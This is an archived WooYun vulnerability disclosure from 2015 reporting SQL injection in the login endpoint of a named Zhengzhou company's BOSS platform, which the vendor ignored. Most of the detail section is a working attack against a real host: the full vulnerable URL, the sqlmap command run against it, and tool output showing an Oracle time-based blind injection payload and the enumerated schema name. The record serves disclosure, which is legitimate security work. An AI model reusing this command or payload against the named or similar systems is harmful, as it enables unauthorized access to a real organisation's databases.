wybug_title: 郑州威科姆科技股份有限公司某系统SQL注入漏洞
wybug_corp: 郑州威科姆科技股份有限公司
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail: 漏洞详情 披露状态： 2015-10-27： 细节已通知厂商并且等待厂商处理中 2015-11-01： 厂商已经主动忽略漏洞，细节向公众公开 简要描述： (づ￣ 3￣)づ说好的礼物呢？ 详细说明： WooYun: 郑州威科姆科技股份有限公司某平台SQL注入30个库 还是BOSS平台存在SQL注入链接登陆就存在注入http://havboss.vcomlive.com/ http://havboss.vcomlive.com/userValidate?_dc=1445933447187&user=admin&pwd=1234556aa&sysid=2&node=100000&service=http%3A%2F%2F61.158.207.26%3A80%2Foss$ sqlmap -u "http://havboss.vcomlive.com/userValidate?_dc=1445933447187&user=admin&pwd=1234556aa&sysid=2&node=100000&service=http%3A%2F%2F61.158.207.26%3A80%2Foss" --dbms=oracle --current-db _ ___ ___| |_____ ___ ___ {1.0-dev-89e3639}|_ -| . | | | .'| . ||___|_ |_|_|_|_|__,| _| |_| |_| http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 16:18:44[16:18:44] [INFO] testing connection to the target URL[16:18:44] [INFO] checking if the target is protected by some kind of WAF/IPS/IDSsqlmap resumed the following injection point(s) from stored session:---Parameter: user (GET) Type: AND/OR time-based blind Title: Oracle AND time-based blind Payload: _dc=1445933447187&user=admin' AND 1560=DBMS_PIPE.RECEIVE_MESSAGE(CHR(81)||CHR(66)||CHR(117)||CHR(74),5) AND 'MPlB'='MPlB&pwd=1234556aa&sysid=2&node=100000&service=http://61.158.207.26:80/oss---[16:18:44] [INFO] the back-end DBMS is Oracleweb application technology: Servlet 2.4, Tomcat 4.3.0.back-end DBMS: Oracle[16:18:44] [INFO] fetching current database[16:18:44] [INFO] resumed: CHARGE[16:18:44] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle): 'CHARGE' 验证当前数据库就好了 30个数据库 漏洞证明： 修复方案： 版权声明：转载请注明来源 ADFSEC@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-01 16:34 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无
